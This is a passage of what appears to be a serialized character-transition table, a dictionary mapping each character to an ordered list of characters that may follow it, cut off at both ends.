'I', 'W', 'Y', 'e', 'T', 'A', 'u', 'N', 'H', 'O', 'c', 'S', 'D', 'n', 'M', 'B', 'a', 'C', 'P', 'L', ',', 'y', 'G', '&', '-', 'i', 'w', 'o', 'E', 'R', 'b', 'F', 'h', 'p', 'J', '1', 'g', '.', 'V', '"', 'f', 'Q', ';', '?', 'K', 'U', '!', ')', '(', '>', 'j', 'q', '#', '$', '%', '*', '+', '/', '0', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '=', '@', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'k', 'x', 'z', '{', '|', '}', '~'], '&': ['q', 'A', 'a', 'o', 'b', '#', 'n', 'c', 'l', 's', 'u', ' ', '!', '"', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'm', 'p', 'r', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], ')': [' ', ',', '.', ';', '&', '-', ':', 'S', '!', '"', '#', '$', '%', "'", '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '(': ['a', 'i', 'w', 'h', 't', 's', 'I', 'f', 'M', 'o', 'p', 'm', 'n', 'L', 'T', 'c', 'N', 'P', 'V', 'b', 'l', 'y', 'A', 'C', 'B', 'E', 'D', 'H', 'O', 'S', '_', 'e', 'd', 'r', 'v', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'F', 'G', 'J', 'K', 'Q', 'R', 'U', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'g', 'j', 'k', 'q', 'u', 'x', 'z', '{', '|', '}', '~'], '*': ["'", ' ', '!', '"', '#', '$', '%', '&', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '-': [' ', '-', 'a', 'b', 's', 't', 'c', 'm', 'w', 'l', 'h', 'r', 'p', 'd', 'f', 'e', 'g', 'o', 'i', 'n', '&', 'u', 'k', 'I', 'y', '"', "'", 'j', 'v', 'M', 'O', 'S', 'C', 'E', 'A', 'H', 'T', 'N', 'q', '!', '?', 'B', 'D', 'G', 'F', 'W', 'Z', '1', '>', 'L', 'P', '#', '$', '%', '(', ')', '*', '+', ',', '.', '/', '0', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '@', 'J', 'K', 'Q', 'R', 'U', 'V', 'X', 'Y', '[', '\\', ']', '^', '_', '`', 'x', 'z', '{', '|', '}', '~'], ',': [' ', '&', "'", '"', '0', 'I', 'A', 't', 'w', 'y', ',', 'B', 'F', 'd', 's', 'E', 'O', 'W', 'Y', 'b', 'h', 'l', 'o', '!', '#', '$', '%', '(', ')', '*', '+', '-', '.', '/', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'C', 'D', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'c', 'e', 'f', 'g', 'i', 'j', 'k', 'm', 'n', 'p', 'q', 'r', 'u', 'v', 'x', 'z', '{', '|', '}', '~'], '.': [' ', '&', "'", '"', 'T', 'A', 'S', 'B', 'H', 'I', 'M', 'W', '>', 'P', 'N', 'O', '.', ',', 'R', 'Y', 'J', 'D', 'F', 'L', ')', 'K', 'C', 'V', 'U', 'E', '-', 'G', '2', '?', 'p', '*', '1', 'Q', 'h', '!', '#', '$', '%', '(', '+', '/', '0', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '@', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '1': ['9', '8', '4', '6', '5', '7', ' ', '.', '3', '1', '0', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '2', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '0': ['0', ' ', ',', '2', '5', 't', '6', ';', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '.', '/', '1', '3', '4', '7', '8', '9', ':', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '3': ['0', ' ', ',', '.', '4', '5', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '1', '2', '3', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '2': [' ', ',', '0', '.', '5', '9', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '1', '2', '3', '4', '6', '7', '8', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '5': [' ', ',', '-', '.', '1', '0', '5', 't', ':', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '/', '2', '3', '4', '6', '7', '8', '9', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '4': ['0', ' ', '7', '.', '6', ';', ',', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '1', '2', '3', '4', '5', '8', '9', ':', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '7': [',', '7', ';', ' ', '.', '0', '2', '5', '6', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '1', '3', '4', '8', '9', ':', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '6': [',', ' ', ';', '9', '0', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '.', '/', '1', '2', '3', '4', '5', '6', '7', '8', ':', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '9': ['1', ' ', '2', '0', ',', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '.', '/', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '8': ['7', ',', '0', ' ', '.', '3', 't', '8', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '1', '2', '4', '5', '6', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], ';': [' ', '&', 'I', 'W', 'T', 'Y', 'A', 'O', 'N', 'B', 'M', 'H', 'S', 'D', 't', 'L', 'a', 'P', 'i', 'C', 'G', 'w', 'y', 'b', 'R', 's', 'F', 'J', 'h', 'E', 'K', '.', 'f', ';', ',', 'V', 'd', 'c', 'm', 'n', 'l', 'p', 'g', '>', 'e', 'r', 'U', 'k', 'u', 'o', 'Q', "'", '-', 'v', 'j', ')', '4', 'q', '!', '(', '2', 'Z', '_', '"', '#', '$', '%', '*', '+', '/', '0', '1', '3', '5', '6', '7', '8', '9', ':', '<', '=', '?', '@', 'X', '[', '\\', ']', '^', '`', 'x', 'z', '{', '|', '}', '~'], ':': [' ', '&', "'", 'I', '-', 'T', 'D', 'E', 'G', 'H', 'K', 'u', '!', '"', '#', '$', '%', '(', ')', '*', '+', ',', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'F', 'J', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '?': [' ', '&', '"', "'", '-', 'T', 'S', 'I', 'W', 'A', 'B', 'D', 'F', 'M', 'N', 'P', '_', ')', 'G', 'H', 'J', 'L', 'O', 'R', 'Y', 'd', '!', '#', '$', '%', '(', '*', '+', ',', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'C', 'E', 'K', 'Q', 'U', 'V', 'X', 'Z', '[', '\\', ']', '^', '`', 'a', 'b', 'c', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '>': ['\n', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'A': ['n', 'l', ' ', 'u', 't', 's', 'h', 'r', 'f', 'm', 'y', 'g', 'N', 'L', 'p', 'R', 'b', 'T', 'c', 'd', 'S', 'w', 'V', 'D', '.', 'M', 'B', 'K', 'P', 'C', 'G', 'F', 'U', 'W', "'", 'I', 'Y', ',', '1', 'a', 'i', 'j', 'v', 'z', '!', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'E', 'H', 'J', 'O', 'Q', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'e', 'k', 'o', 'q', 'x', '{', '|', '}', '~'], 'C': ['o', 'a', 'h', 'e', 'l', 'r', 'A', 'O', 'E', 'i', 'u', ' ', 'I', '3', 'T', 'H', 'R', '2', 'y', '&', ',', '.', 'K', 'L', 'S', 'U', 'Y', '!', '"', '#', '$', '%', "'", '(', ')', '*', '+', '-', '/', '0', '1', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'F', 'G', 'J', 'M', 'N', 'P', 'Q', 'V', 'W', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'j', 'k', 'm', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'B': ['u', 'a', 'e', 'o', 'r', 'i', 'l', 'y', 'E', 'L', 'U', '.', 'S', ' ', 'O', 'R', 'Y', ',', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'I', 'J', 'K', 'M', 'N', 'P', 'Q', 'T', 'V', 'W', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'm', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'E': ['m', 'n', 'v', ' ', 'l', 'u', 'R', 'a', 'S', 'D', 'L', 'N', 'E', 'h', 'x', 'A', 'V', '.', 'g', 'M', 'd', '!', ',', 'i', 'I', 't', 'T', 'Y', 's', '?', 'C', 'r', 'f', 'O', 'W', 'X', 'B', 'G', 'F', 'K', 'P', 'c', 'q', 'p', 'y', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'H', 'J', 'Q', 'U', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'e', 'j', 'k', 'o', 'w', 'z', '{', '|', '}', '~'], 'D': ['o', 'e', 'a', 'i', 'r', ' ', 'u', 'O', 'E', 'I', '.', 'N', ',', 'A', 'S', "'", 'D', 'R', 'U', 'y', 'L', '!', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'F', 'G', 'H', 'J', 'K', 'M', 'P', 'Q', 'T', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'G': ['l', 'o', 'e', 'r', 'u', 'i', 'a', '.', ' ', 'E', 'H', '!', ',', 'h', 'A', 'I', 'O', 'G', 'N', 'S', 'R', 'U', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'F', 'J', 'K', 'L', 'M', 'P', 'Q', 'T', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'j', 'k', 'm', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'F': ['r', 'o', 'a', 'i', 'l', 'e', 'u', 'E', 'O', 'I', ' ', 'A', 'R', 'U', 'T', 'F', '.', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'S', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'm', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'I': [' ', 't', "'", 'n', 'f', 's', 'N', '?', 'S', ',', 'T', 'd', 'r', 'w', 'c', 'm', 'E', 'D', 'V', 'L', 'R', '.', 'l', 'C', 'G', '_', 'k', 'O', 'a', 'g', 'h', 'F', '!', 'A', 'B', 'M', 'b', 'v', '-', 'I', 'P', 'o', ';', 'K', 'Q', 'X', 'e', '"', '#', '$', '%', '&', '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '=', '>', '@', 'H', 'J', 'U', 'W', 'Y', 'Z', '[', '\\', ']', '^', '`', 'i', 'j', 'p', 'q', 'u', 'x', 'y', 'z', '{', '|', '}', '~'], 'H': ['e', 'a', 'o', 'i', 'E', 'u', 'A', 'I', 'O', 'T', ' ', 'y', 'R', 'm', 'Y', '.', 'Q', 'U', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'P', 'S', 'V', 'W', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'K': ['a', 'e', 'i', 'N', 'E', 'n', ' ', 'I', 'r', '.', ',', 'S', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'O', 'P', 'Q', 'R', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'o', 'p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'J': ['a', 'e', 'u', 'o', 'i', '.', 'A', 'U', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'M': ['r', 'a', 'i', 'o', 'y', 'u', 'e', 'E', 'A', ' ', 'U', 'O', '.', 'I', 'P', 'L', 'B', 'Y', '-', ',', 'S', 'c', 'm', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'N', 'Q', 'R', 'T', 'V', 'W', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'L': ['u', 'o', 'a', 'e', 'i', 'L', ' ', 'I', 'E', 'O', 'D', 'Y', ',', 'M', 'l', 'F', 'U', 'T', '.', 'A', 'S', 'C', '!', "'", '?', 'K', 'W', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'B', 'G', 'H', 'J', 'N', 'P', 'Q', 'R', 'V', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'O': ['h', 'n', 'g', 'f', 'r', 'U', 'u', 'N', 'l', ' ', 'T', 'W', 'R', 'M', 't', 'L', 'x', 'c', 'V', '!', 'v', 'E', 'S', 'O', 'b', 'w', '.', 'K', 'p', ',', 'B', 'P', 'd', 'F', 'I', 'A', 'G', 'Y', 's', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'C', 'D', 'H', 'J', 'Q', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'e', 'i', 'j', 'k', 'm', 'o', 'q', 'y', 'z', '{', '|', '}', '~'], 'N': ['o', 'e', 'a', 'G', 'O', 'E', "'", 'T', ' ', 'D', 'i', 'C', 'S', '.', ',', 'A', 'I', 'Y', 'N', 'V', '!', 'K', '?', 'B', 'R', 'W', 'u', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'F', 'H', 'J', 'L', 'M', 'P', 'Q', 'U', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'Q': ['u', 'U', 'c', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'P': ['h', 'u', 'e', 'o', 'a', 'r', 'l', 'i', 's', 'E', 'I', 'O', '.', 'P', 'L', 'y', 'A', 'U', ' ', 'H', 'S', 'R', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'F', 'G', 'J', 'K', 'M', 'N', 'Q', 'T', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'j', 'k', 'm', 'n', 'p', 'q', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'S': ['h', 'o', 't', 'u', 'a', 'i', 'y', 'e', ' ', 'c', 'p', 'T', 'E', 'S', 'O', 'w', 'H', '.', 'l', 'I', 'P', 'A', 'm', ',', 'C', 'N', 'U', 'q', 'L', 'k', 'n', 'W', '?', 'Y', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'B', 'D', 'F', 'G', 'J', 'K', 'M', 'Q', 'R', 'V', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'd', 'f', 'g', 'j', 'r', 's', 'v', 'x', 'z', '{', '|', '}', '~'], 'R': ['i', 'o', 'e', 'E', ' ', 'a', 'I', 'S', 'u', 'Y', 'A', 'T', 'h', '.', 'D', 'M', 'O', 'C', ',', 'K', 'R', '!', '?', 'F', 'N', 'U', 'V', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'B', 'G', 'H', 'J', 'L', 'P', 'Q', 'W', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'U': ['n', 'p', 'L', 'S', 'T', 'R', 'N', ' ', 'I', ',', 'A', 's', 'C', 'G', 'l', '.', 'P', 'g', 'r', 't', "'", 'E', 'D', 'M', 'O', '!', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'F', 'H', 'J', 'K', 'Q', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'h', 'i', 'j', 'k', 'm', 'o', 'q', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'T': ['h', 'o', 'u', ' ', 'r', 'e', 'H', 'a', 'i', 'w', 'E', 'I', '.', 'O', ',', 'R', '!', 'W', 'Y', 'N', 'S', 'y', '&', '?', 'A', 'L', 'U', 'T', 'c', 's', '"', '#', '$', '%', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'B', 'C', 'D', 'F', 'G', 'J', 'K', 'M', 'P', 'Q', 'V', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'd', 'f', 'g', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 't', 'v', 'x', 'z', '{', '|', '}', '~'], 'W': ['h', 'e', 'a', 'i', 'o', 'y', 'A', 'O', ' ', 'r', 'E', 'I', 'H', '.', ',', 'F', 'N', 'R', '?', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'B', 'C', 'D', 'G', 'J', 'K', 'L', 'M', 'P', 'Q', 'S', 